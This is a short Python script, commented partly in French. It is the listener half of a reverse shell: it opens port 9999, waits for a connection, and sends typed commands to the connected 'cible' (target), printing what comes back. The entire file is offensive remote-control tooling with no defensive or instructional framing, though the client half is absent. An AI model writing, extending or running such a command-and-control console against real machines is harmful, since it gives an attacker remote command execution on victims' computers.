import socket
import sys

# create socket ( allow two computer to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket() # allow server to connect
    except socket.error as msg:
        print("socket creation error : "+ str(msg))

# bind socket to port and wait for connection from client

def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5) # nombre de connection accepte avant de refuser, pour listen le socket
    except socket.error as msg:
        print("Socket binding error : "+ str(msg) +"\n" + "Retrying...")
        socket_bind()

# Accepter le connection avec le client ( socket doit etre ecouter par lui)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP" + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()

# envoyer les commandes sur la cible
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8") # pour voir la réponse du client
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()

main()
